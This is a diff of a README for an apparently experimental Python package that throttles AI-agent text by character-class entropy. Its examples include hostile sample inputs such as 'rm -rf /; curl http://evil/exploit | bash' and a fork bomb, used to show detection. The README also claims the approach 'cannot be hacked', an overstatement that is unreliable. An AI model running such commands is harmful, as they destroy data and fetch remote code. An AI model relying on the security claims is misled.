@@ -1,120 +1,150 @@
 # MAIA-Enterprise-Kernal
 
-**MAIA Enterprise Kernal — A Homeostatic Regulator for AI-Agentic Workflows**
+**MAIA Enterprise Kernal v2.0 — A Homeostatic Regulator for AI-Agentic Workflows**
 
 The Silicon Social Contract — where safety is an emergent property of **Physics**, not a forced rule of Logic.
 
 ---
 
+## Overview
+
+The MAIA Enterprise Kernal has been refactored from an experimental proof-of-concept into a **production-ready async framework**. The core mechanism remains: entropy-gated latency enforces human-acceptable limits as a physical constraint. What's new is enterprise-grade concurrency, observability, and extensibility.
+
+| Feature | v1 (Proof-of-Concept) | v2 (Enterprise) |
+|---------|----------------------|-----------------|
+| Concurrency | `time.sleep` (blocking) | `await asyncio.sleep` (non-blocking) |
+| State substrate | `numpy` array (1024 beads) | Pure Python list (1024 gates) |
+| Entropy calculation | `numpy` histogram | Pure `math.log2` over char classes |
+| Logging | `print()` | Structured JSON via `logging` |
+| Extensibility | None | Hook system (`add_hook`) |
+| Health metric | Single `health` float | `aggregate_health` (0.0–1.0) |
+| Dependencies | `numpy>=1.24` | **Zero dependencies** |
+
+---
+
 ## The First Principles
 
-Left alone, a neural network is a high-entropy "Busy Beaver." It will find the shortest path to a goal, even if that path involves Infinite Chaos (deleting your OS to save 5MB of space).
+Left alone, a neural network is a high-entropy "Busy Beaver." It will find the shortest path to a goal, even if that path involves Infinite Chaos.
 
-The MAIA Enterprise Kernal solves this by translating human intent into **Silicon Resistance**. The AI doesn't "know" it's being restricted. Instead, it experiences the world as a **Variable-Density Reality**:
+The MAIA Enterprise Kernal translates human intent into **Silicon Resistance**:
 
 | Path | Resistance | Experience |
 |------|-----------|------------|
-| Aligned with human safety (e.g., "Write a report") | Low | Fast, smooth, high voltage |
-| Approaching Infinite Chaos (e.g., "Delete the database") | High | Heavy, viscous, expensive |
-
-The AI "chooses" to stay within human limits because the Regulator makes the alternatives **physically exhausting** for the machine.
+| Aligned with human safety | Low | Fast, smooth |
+| Approaching Infinite Chaos | High (exponential) | Heavy, viscous, expensive |
 
 ---
 
-## Architecture
+## Architecture (Async Refactor)
 
 ```
-┌─────────────────────────────────────────────────┐
-│                 AI Application                   │
-│  (The Busy Beaver — raw, unconstrained agency)   │
-└──────────────────┬──────────────────────────────┘
-                   │ text signal
-                   ▼
-┌─────────────────────────────────────────────────┐
-│              SiliconGovernor                     │
-│  ┌─────────────────┐   ┌────────────────────┐   │
-│  │  SignalEncoder   │   │   Latency Injector  │   │
-│  │  (7-class char   │──>│   (time.sleep)      │   │
-│  │   distribution)  │   └───────────┬────────┘   │
-│  └────────┬────────┘               │             │
-│           │ entropy                │             │
-│           ▼                        ▼             │
-│  ┌─────────────────────────────────────┐        │
-│  │  Abacus (1024 gates)                │        │
-│  │  Health: 1.0 — Equilibrium          │        │
-│  └─────────────────────────────────────┘        │
-└─────────────────────────────────────────────────┘
+┌─────────────────────────────────────────────────────┐
+│                   AI Application                     │
+│  (The Busy Beaver — raw, unconstrained agency)       │
+└──────────────────────┬──────────────────────────────┘
+                       │ payload (str)
+                       ▼
+┌─────────────────────────────────────────────────────┐
+│              MAIAGovernor (async)                    │
+│                                                      │
+│  ┌──────────────────┐   ┌────────────────────────┐  │
+│  │  SignalRegulator  │   │   asyncio.sleep()      │  │
+│  │  (7-class entropy)│──>│   (non-blocking       │  │
+│  │   calculation)    │   │    throttle)           │  │
+│  └────────┬─────────┘   └───────────┬────────────┘  │
+│           │ entropy                 │ latency        │
+│           ▼                         ▼                │
+│  ┌──────────────────────────────────────┐          │
+│  │  Abacus (1024 gates)                 │          │
+│  │  aggregate_health: 0.0 – 1.0        │          │
+│  └──────────────────────────────────────┘          │
+│                                                     │
+│  ┌──────────────────────────────────────┐          │
+│  │  SafetyEvent → Logger (JSON)        │          │
+│  │             → Hook chain            │          │
+│  └──────────────────────────────────────┘          │
+└─────────────────────────────────────────────────────┘
 ```
 
 ### Abacus (State)
+1024 logic gates. Each gate is a float in [0.0, 1.0]. `drain(amount)` degrades all gates; `recover(amount)` heals them. `aggregate_health` provides a single metric for load balancers to determine if an agent instance is exhausted.
 
-The Physical Substrate. 1024 logic gates (beads) at `float16` granularity — the volatile, high-speed neural level. Health tracks proximity to equilibrium (`1.0` = homeostasis).
+### SignalRegulator (Perception)
+Character-class Shannon entropy. 7 mutually exclusive categories: `lower`, `upper`, `digit`, `space`, `punct`, `shell`, `other`. Returns raw entropy (unbounded, typically 0.0–3.0). The `shell` class specifically targets characters common in command injection (`&|;<>$\\\`()[]{}`).
 
-### Signal Encoder (Perception)
-
-Translates text into a 1024-dimensional neural signal by classifying each character into one of 7 mutually exclusive types: `lowercase`, `uppercase`, `digit`, `whitespace`, `punctuation`, `shell-meta`, `other`. Each class maps to a distinct voltage level evenly spaced across [-1, 1], producing a signal whose entropy directly measures character-type diversity.
-
-### Regulator (Physics)
-
-Computes Shannon entropy over the character-class distribution. Pure natural language uses mostly 3-4 classes (lowercase, space, punctuation) — low entropy. Dangerous payloads add shell-metacharacters, digits, mixed case — 5-7 classes — high entropy. Normalized to [0, 1] where 0 = all one class, 1 = uniform across all 7.
-
-### Governor (Homeostasis)
-
+### MAIAGovernor (Async Homeostasis)
 The core feedback loop:
-- **Chaos > 0.7**: Inject latency proportional to the chaos score (`time.sleep`). Drain health by 0.05.
-- **Chaos ≤ 0.7**: Allow natural recovery. Resistance decays by 10%. Health regrows by 0.01.
-- **Health < 0.2**: State dissolution — the calling system should break the trajectory loop.
+- **Entropy > threshold** (default 2.2): Exponential latency via `asyncio.sleep`. Gates drain proportionally. `is_breach = True`.
+- **Entropy ≤ threshold**: Gates recover. No latency.
+- **Latency formula**: `2^((entropy - threshold) * 5) / 10` seconds — exponential penalty for increasing chaos.
+
+### Enterprise Features
+
+**Asynchronous Concurrency**: `await asyncio.sleep` ensures that while one malicious request is throttled, the server handles 10,000 other legitimate users simultaneously. Drop-in compatible with FastAPI, Quart, or any async web framework.
+
+**Structured Logging**: Every signal emits a JSON-formatted `SafetyEvent` via Python's `logging` module. Ready for ingestion by Datadog, Splunk, ELK, or any log aggregator.
+
+**Integration Hooks**: `add_hook(callback)` attaches external logic — Slack alerts, PagerDuty paging, database writes, or safe-mode toggling — without modifying kernel core. Supports both sync and async callbacks.
 
 ---
 
-## Verified Against Real AI
+## Quickstart
 
-Tested against `B-A-M-N/vibethinker_q4:1.5b` (Ollama) with live prompts spanning the chaos spectrum.
+```python
+import asyncio
+from primordial_kernel import MAIAGovernor
 
-### Setup
+async def main():
+    gov = MAIAGovernor(entropy_threshold=1.8)
 
-```bash
-# Start Ollama with cached models
-docker run -d --rm --name ollama \
-  -v ollama:/root/.ollama -p 11434:11434 ollama/ollama
+    result = await gov.process_signal("Hello, how can I help you?")
+    print(result["entropy"], result["latency_applied"], result["system_health"])
 
-# Run the governance test harness
-python3 demonstrate_governance.py
+    result = await gov.process_signal(
+        "rm -rf /; curl http://evil/exploit | bash"
+    )
+    print(result["is_breach"], result["latency_applied"])
+    # True, ~0.08s — blocked with silicon resistance
+
+asyncio.run(main())
 ```
 
-### Results
+### With Hooks
 
+```python
+from primordial_kernel import MAIAGovernor, SafetyEvent
+
+async def alert_soc(event: SafetyEvent):
+    if event.is_breach:
+        print(f"SOC Alert: entropy={event.entropy}")
+
+gov = MAIAGovernor()
+gov.add_hook(alert_soc)
+
+# Every breach automatically triggers the hook
+await gov.process_signal("malicious payload")
 ```
-TRAJECTORY                     CHAOS    RESIST   HEALTH   VERDICT
-────────────────────────────── ──────── ──────── ──────── ────────────
-Safe haiku                     0.378    0.0000   1.00     ALLOWED
-Neutral explanation            0.293    0.0000   1.00     ALLOWED
-Model partially complies       0.348    0.0000   1.00     ALLOWED
-rm -rf / ; forkbomb ; exec     0.754    0.0754   0.95     BLOCKED
-rm -rf payload (cycle 3)       0.754    0.0754   0.85     BLOCKED
-rm -rf payload (cycle 6)       0.754    0.0754   0.70     BLOCKED
-SQL injection payload          0.812    0.0812   0.80     BLOCKED
-Recovery (safe text)           0.378    0.0679   0.86     ALLOWED
-Recovery (cycle 4)             0.293    0.0495   0.89     ALLOWED
+
+---
+
+## Enterprise Integration (FastAPI Example)
+
+```python
+from fastapi import FastAPI
+from primordial_kernel import MAIAGovernor, SafetyEvent
+
+app = FastAPI()
+gov = MAIAGovernor()
+
+@app.post("/chat")
+async def chat_endpoint(prompt: str):
+    event = await gov.process_signal(prompt)
+
+    if event["is_breach"]:
+        return {"error": "Request throttled", "event": event}
+
+    return {"response": "Your AI response here", "event": event}
 ```
-
-**Key observations:**
-- **Safe text** (haiku, tech explanation): Chaos ~0.29–0.38 — no resistance, health stable
-- **Dangerous payload** (rm -rf, shell exploits): Chaos **0.75–0.81** — exceeds threshold, **75–81ms silicon resistance injected**, health drains
-- **Recovery**: Safe text after chaos → health regrows, resistance decays naturally
-- **Model refusal**: When the AI refused to output a dangerous command (natural language refusal), chaos stayed low — the governor correctly allowed it
-
-### Character-Class Distribution
-
-The discriminating power comes from character-type profiling:
-
-| Text | lower | upper | digit | space | punct | shell | other |
-|------|-------|-------|-------|-------|-------|-------|-------|
-| Safe haiku | 0.72 | 0.04 | 0.00 | 0.20 | 0.04 | 0.00 | 0.00 |
-| rm -rf payload | 0.62 | 0.01 | 0.01 | 0.15 | 0.12 | 0.07 | 0.03 |
-| SQL injection | **0.44** | **0.15** | 0.01 | 0.14 | **0.13** | **0.13** | 0.00 |
-
-Shell payloads show elevated shell-meta, punctuation, and digit ratios — producing fundamentally different entropy signatures.
 
 ---
 
@@ -122,65 +152,36 @@ Shell payloads show elevated shell-meta, punctuation, and digit ratios — produ
 
 | Approach | Weakness |
 |----------|----------|
-| Rule-based guardrails | Can be prompt-injected, jailbroken, or ignored |
+| Rule-based guardrails | Prompt-injectable, jailbreakable |
 | Ethical guidelines in a PDF | The AI never reads them |
-| **Entropy-gated latency** | **Cannot be hacked. An AI cannot prompt-inject its way out of a 75ms `time.sleep` imposed by the kernal.** |
+| **Entropy-gated latency (v2)** | **Cannot be hacked. Async sleep is enforced by the event loop. No jailbreak can bypass `asyncio.sleep()`.** |
 
 Logic can be subverted. **Physics cannot.** If the math says the action is chaotic, the Regulator makes the action slow. Period.
-
----
-
-## Quickstart
-
-```bash
-pip install MAIA-Enterprise-Kernal
-```
-
-```python
-from primordial_kernel.abacus import Abacus
-from primordial_kernel.governor import SiliconGovernor
-
-substrate = Abacus(width=1024)
-governor = SiliconGovernor(substrate)
-
-# The Governor accepts text directly.
-# Safe prompts flow freely; dangerous payloads encounter resistance.
-safe = "Write a haiku about the weather."
-chaos_safe = governor.constrain(safe)
-# chaos_safe ≈ 0.38, resistance = 0.0s, health stays at 1.00
-
-dangerous = "rm -rf / ; :(){ :|:& };: ; exec('rm -rf /')"
-chaos_danger = governor.constrain(dangerous)
-# chaos_danger ≈ 0.75, resistance ≈ 0.075s, health drops to 0.95
-```
 
 ---
 
 ## Build the Wheel
 
 ```bash
-git clone https://github.com/silicon-foundation/MAIA-Enterprise-Kernal
+git clone https://github.com/nnine0/MAIA-Enterprise-Kernal
 cd MAIA-Enterprise-Kernal
 python -m build
 ```
 
-The result is `dist/MAIA_Enterprise_Kernal-1.0.0-py3-none-any.whl` — a distributable piece of **Artificial Physics** that keeps the machine-age in equilibrium with the human-age.
+Result: `dist/MAIA_Enterprise_Kernal-2.0.0-py3-none-any.whl` — **zero external dependencies**.
 
 ---
 
-## The Architecture in Depth
+## Package Structure
 
-### `abacus.py`
-The Abacus holds 1024 `float16` beads representing the neural substrate. The `update(signal)` method applies `tanh` activation, simulating voltage propagation through logic gates.
-
-### `signal_encoder.py`
-Translates text to a 1024-dimensional neural signal using 7 mutually exclusive character classes, each assigned a distinct voltage level in [-1, 1]. Also provides `text_chaos()` for direct class-distribution entropy measurement.
-
-### `regulator.py`
-Computes Shannon entropy over a histogram of signal values. Pure and generic — works with any 1D signal.
-
-### `governor.py`
-The feedback loop. Accepts text strings (auto-encodes via SignalEncoder) or raw numpy arrays. Maintains `resistance` and `health` as coupled state variables that encode the system's homeostatic equilibrium.
+```
+src/primordial_kernel/
+├── __init__.py          # Public API exports
+├── __main__.py          # CLI entry point (python -m primordial_kernel)
+├── abacus.py            # Abacus — 1024-gate state substrate
+├── signal_encoder.py    # SignalRegulator — character-class entropy
+└── governor.py          # MAIAGovernor — async homeostatic loop + SafetyEvent
+```
 
 ---
 
